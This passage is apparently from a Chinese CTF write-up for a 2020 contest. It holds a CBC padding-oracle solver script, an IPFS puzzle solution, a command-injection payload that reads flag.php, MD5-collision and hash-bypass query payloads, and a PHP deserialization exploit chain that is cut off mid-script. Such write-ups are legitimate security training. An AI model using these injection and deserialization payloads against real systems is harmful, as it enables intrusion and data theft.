</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_6</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your choice:&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;6&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;challenge 6</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>iv</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=s2>&#34;31313131313131313131313131313131&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>c1</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=s2>&#34;ab852396af79701989fdeafca2e8a5457db6307920981252c49622d9c5428917&#34;</span><span class=p>)[:</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>secret</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;M</span><span class=se>\x1f</span><span class=s1>C^</span><span class=se>\xbc\x8f</span><span class=s1>}N</span><span class=se>\xc4\x06</span><span class=s1>lG</span><span class=se>\x16\xa9\xbd</span><span class=s1>S&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>15</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>secret</span><span class=p>),</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>256</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>j</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>new_iv</span> <span class=o>=</span> <span class=n>xor</span><span class=p>(</span><span class=n>iv</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=o>*</span><span class=n>i</span> <span class=o>+</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>j</span><span class=p>])</span> <span class=o>+</span> <span class=n>xor</span><span class=p>(</span><span class=n>secret</span><span class=p>,</span> <span class=nb>bytes</span><span class=p>([</span><span class=mi>16</span><span class=o>-</span><span class=n>i</span><span class=p>])</span><span class=o>*</span><span class=p>(</span><span class=mi>16</span><span class=o>-</span><span class=n>i</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=n>new_iv</span> <span class=o>+</span> <span class=n>c1</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your choice:&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;input your iv+c (encode hex):&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=sa>b</span><span class=s2>&#34;success&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>():</span>
</span></span><span class=line><span class=cl>                <span class=n>secret</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>([(</span><span class=mi>16</span><span class=o>-</span><span class=n>i</span><span class=p>)</span> <span class=o>^</span> <span class=n>j</span><span class=p>])</span> <span class=o>+</span> <span class=n>secret</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>secret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your choice:&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span> <span class=c1># secert</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;secret&#34;</span><span class=p>,</span> <span class=n>secret</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>solve_1</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>solve_2</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>solve_3</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>solve_4</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>solve_5</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>solve_6</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://hackmd.summershrimp.com/uploads/upload_89f5b8eb5b121d8ba732901351531e73.png alt></p><h2 id=blockchain>Blockchain</h2><h3 id=ipfs>IPFS</h3><p>可以通过命令<code>ipfs cat &lt;hash> > i.data</code>把pic1.jpg的6块block给下载下来，很明显第4条hash对应jpg文件的开头，第5条hash对应jpg文件的结尾</p><p>剩余的4块可以穷举拼接一下，看能不能恢复成正常的图形：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>itertools</span> <span class=kn>import</span> <span class=n>permutation</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pics</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pics</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>open</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2>.data&#34;</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>perm</span> <span class=ow>in</span> <span class=n>permutations</span><span class=p>([</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>5</span><span class=p>],</span> <span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>pics</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=c1># 4th hash</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>perm</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>+=</span> <span class=n>pics</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>+=</span> <span class=n>pics</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=c1># 5th hash</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>perm</span><span class=p>)</span><span class=si>}</span><span class=s2>.jpg&#34;</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>发现0213.jpg可以正常显示：</p><p><img src=https://i.loli.net/2020/08/23/WhGOoXKJQVyH4c2.png alt="Screen Shot 2020-08-23 at 2.32.56 AM"></p><p>pic2.jpg，给出了文件的sha256sum，根据QmHash的格式，可以得到pic2.jpg的QmHash：</p><p><img src=https://i.loli.net/2020/08/23/vsh6M3fpr9OAx2Q.png alt=image-20200823023341028></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base58</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>base58</span><span class=o>.</span><span class=n>b58encode</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=s2>&#34;1220&#34;</span><span class=o>+</span><span class=s2>&#34;659c2a2c3ed5e50f848135eea4d3ead3fa2607e2102ae73fafe8f82378ce1d1e&#34;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=c1># b&#39;QmVBHzwuchpfHLxEqNrBb3492E73DHE99yFCxx1UYcJ6R3&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p><code>ipfs cat QmVBHzwuchpfHLxEqNrBb3492E73DHE99yFCxx1UYcJ6R3 > pic2.jpg</code>可以得到第二张图片：</p><p><img src=https://i.loli.net/2020/08/23/yltfSPeMgpYLJUu.png alt="Screen Shot 2020-08-23 at 2.36.21 AM"></p><p>组合起来就是：<code>flag=flag{md5( hash1 + hash2 )}</code></p><p>hash2已经有了：QmVBHzwuchpfHLxEqNrBb3492E73DHE99yFCxx1UYcJ6R3</p><p>hash1可以通过再重新上传pic1.jpg得到。</p><p>观察发现出题人上传pic1.jpg时，设置的block-size是26624</p><p>看一下<code>ipfs add --help</code>发现能够通过<code>--chunker=size-26624</code>指定block的大小</p><p><img src=https://i.loli.net/2020/08/23/1hvuTxL9gWVQJpj.png alt="Screen Shot 2020-08-23 at 2.39.27 AM"></p><p>重新上传得到root hash：QmYjQSMMux72UH4d6HX7tKVFaP27UzC65cRchbVAsh96Q7</p><p>flag{35fb9b3fe44919974a02c26f34369b8e}</p><h2 id=强网先锋>强网先锋</h2><h3 id=主动>主动</h3><p>ip=127.0.0.1;cat%20fl\ag.php</p><h3 id=upload>upload</h3><p>流量包题</p><p>分析流量包可知，上传了一个steghide.jpg文件，将其导出，<code>steghide extract -sf steghide.jpg</code>，密码123456，得到flag.txt</p><p>flag{te11_me_y0u_like_it}</p><h3 id=funhash>Funhash</h3><p>web题 http://39.101.177.96/
payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://39.101.177.96/?hash1=0e251288019&amp;hash2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;hash3=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&amp;hash4=ffifdyop
</span></span></code></pre></td></tr></table></div></div><h3 id=web辅助>web辅助</h3><p><a href=http://eci-2ze9cia09xafqb8rd109.cloudeci1.ichunqiu.com/>http://eci-2ze9cia09xafqb8rd109.cloudeci1.ichunqiu.com/</a><br>签到题，看脚本吧，没什么难度</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=n>topsolo</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>protected</span> <span class=o>$</span><span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=n>function</span> <span class=n>__construct</span><span class=p>(</span><span class=o>$</span><span class=n>name</span> <span class=o>=</span> <span class=s1>&#39;Riven&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>name</span> <span class=o>=</span> <span class=o>$</span><span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=n>function</span> <span class=n>TP</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>gettype</span><span class=p>(</span><span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>name</span><span class=p>)</span> <span class=o>===</span> <span class=s2>&#34;function&#34;</span> <span class=ow>or</span> <span class=n>gettype</span><span class=p>(</span><span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>name</span><span class=p>)</span> <span class=o>===</span> <span class=s2>&#34;object&#34;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>name</span> <span class=o>=</span> <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>name</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=n>midsolo</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>protected</span> <span class=o>$</span><span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=n>function</span> <span class=n>__construct</span><span class=p>(</span><span class=o>$</span><span class=n>name</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>name</span> <span class=o>=</span> <span class=o>$</span><span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=n>function</span> <span class=n>__wakeup</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>name</span> <span class=o>!==</span> <span class=s1>&#39;Yasuo&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>name</span> <span class=o>=</span> <span class=s1>&#39;Yasuo&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>echo</span> <span class=s2>&#34;No Yasuo! No Soul!</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=n>function</span> <span class=n>__invoke</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>Gank</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=n>function</span> <span class=n>Gank</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>stristr</span><span class=p>(</span><span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>name</span><span class=p>,</span> <span class=s1>&#39;Yasuo&#39;</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=n>echo</span> <span class=s2>&#34;Are you orphan?</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>echo</span> <span class=s2>&#34;Must Be Yasuo!</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=n>jungle</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>protected</span> <span class=o>$</span><span class=n>name</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=n>function</span> <span class=n>__construct</span><span class=p>(</span><span class=o>$</span><span class=n>name</span> <span class=o>=</span> <span class=s2>&#34;Lee Sin&#34;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>name</span> <span class=o>=</span> <span class=o>$</span><span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=n>function</span> <span class=n>KS</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=n>echo</span> <span class=s2>&#34;triggered&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=n>function</span> <span class=n>__toString</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>KS</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=n>player</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>protected</span> <span class=o>$</span><span class=n>user</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>protected</span> <span class=o>$</span><span class=k>pass</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>protected</span> <span class=o>$</span><span class=n>admin</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=n>function</span> <span class=n>__construct</span><span class=p>(</span><span class=o>$</span><span class=n>user</span><span class=p>,</span> <span class=o>$</span><span class=k>pass</span><span class=p>,</span> <span class=o>$</span><span class=n>admin</span> <span class=o>=</span> <span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>user</span> <span class=o>=</span> <span class=o>$</span><span class=n>user</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=k>pass</span> <span class=o>=</span> <span class=o>$</span><span class=k>pass</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>admin</span> <span class=o>=</span> <span class=o>$</span><span class=n>admin</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=n>function</span> <span class=n>get_admin</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>admin</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>function</span> <span class=n>read</span><span class=p>(</span><span class=o>$</span><span class=n>data</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>data</span> <span class=o>=</span> <span class=n>str_replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>*</span><span class=se>\0</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>chr</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;*&#34;</span><span class=o>.</span><span class=n>chr</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span> <span class=o>$</span><span class=n>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>$</span><span class=n>data</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>function</span> <span class=n>write</span><span class=p>(</span><span class=o>$</span><span class=n>data</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>data</span> <span class=o>=</span> <span class=n>str_replace</span><span class=p>(</span><span class=n>chr</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;*&#34;</span><span class=o>.</span><span class=n>chr</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span> <span class=s1>&#39;</span><span class=se>\0</span><span class=s1>*</span><span class=se>\0</span><span class=s1>&#39;</span><span class=p>,</span> <span class=o>$</span><span class=n>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>$</span><span class=n>data</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>jungle</span> <span class=o>=</span> <span class=n>new</span> <span class=n>jungle</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>mid</span> <span class=o>=</span> <span class=n>new</span> <span class=n>midsolo</span><span class=p>(</span><span class=o>$</span><span class=n>jungle</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>top</span> <span class=o>=</span> <span class=n>new</span> <span class=n>topsolo</span><span class=p>(</span><span class=o>$</span><span class=n>mid</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=nb>exp</span> <span class=o>=</span> <span class=n>serialize</span><span class=p>(</span><span class=o>$</span><span class=n>top</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=nb>exp</span> <span class=o>=</span> <span class=n>str_replace</span><span class=p>(</span><span class=s2>&#34;s:7:</span><span class=se>\&#34;\x00</span><span class=s2>*</span><span class=se>\x00</span><span class=s2>name</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s1>&#39;S:7:&#34;</span><span class=se>\00</span><span class=s1>*</span><span class=se>\00\6</span><span class=s1>eame&#34;&#39;</span><span class=p>,</span> <span class=o>$</span><span class=nb>exp</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=n>strlen</span><span class=p>(</span><span class=o>$</span><span class=nb>exp</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>var_dump</span><span class=p>(</span><span class=o>$</span><span class=nb>exp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>username</span> <span class=o>=</span>  <span class=n>str_repeat</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>*</span><span class=se>\0</span><span class=s1>&#39;</span><span class=p>,</span> <span class=mi>13</span><span class=p>)</span> <span class=o>.</span> <span class=s1>&#39;a&#39;</span><span class=p>;</span>
